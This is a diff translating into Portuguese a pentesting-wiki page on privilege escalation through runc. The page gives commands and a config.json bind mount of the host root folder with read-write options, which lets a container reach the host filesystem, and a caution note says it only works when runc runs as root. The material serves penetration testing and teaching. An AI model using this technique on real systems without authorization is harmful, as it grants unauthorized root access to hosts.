@@ -1,10 +1,10 @@
-# RunC Privilege Escalation
+# Escalação de Privilégios do RunC
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Basic information
+## Informações básicas
 
-If you want to learn more about **runc** check the following page:
+Se você quiser saber mais sobre **runc**, consulte a seguinte página:
 
 {{#ref}}
 ../../network-services-pentesting/2375-pentesting-docker.md
@@ -12,22 +12,21 @@ If you want to learn more about **runc** check the following page:
 
 ## PE
 
-If you find that `runc` is installed in the host you may be able to **run a container mounting the root / folder of the host**.
-
+Se você descobrir que `runc` está instalado no host, pode ser possível **executar um contêiner montando a pasta raiz / do host**.
 ```bash
 runc -help #Get help and see if runc is intalled
 runc spec #This will create the config.json file in your current folder
 
 Inside the "mounts" section of the create config.json add the following lines:
 {
-    "type": "bind",
-    "source": "/",
-    "destination": "/",
-    "options": [
-        "rbind",
-        "rw",
-        "rprivate"
-    ]
+"type": "bind",
+"source": "/",
+"destination": "/",
+"options": [
+"rbind",
+"rw",
+"rprivate"
+]
 },
 
 #Once you have modified the config.json file, create the folder rootfs in the same directory
@@ -37,8 +36,7 @@ mkdir rootfs
 # The root folder is the one from the host
 runc run demo
 ```
-
 > [!CAUTION]
-> This won't always work as the default operation of runc is to run as root, so running it as an unprivileged user simply cannot work (unless you have a rootless configuration). Making a rootless configuration the default isn't generally a good idea because there are quite a few restrictions inside rootless containers that don't apply outside rootless containers.
+> Isso nem sempre funcionará, pois a operação padrão do runc é ser executado como root, então executá-lo como um usuário sem privilégios simplesmente não pode funcionar (a menos que você tenha uma configuração sem root). Tornar uma configuração sem root a padrão geralmente não é uma boa ideia, pois há várias restrições dentro de contêineres sem root que não se aplicam fora de contêineres sem root.
 
 {{#include ../../banners/hacktricks-training.md}}
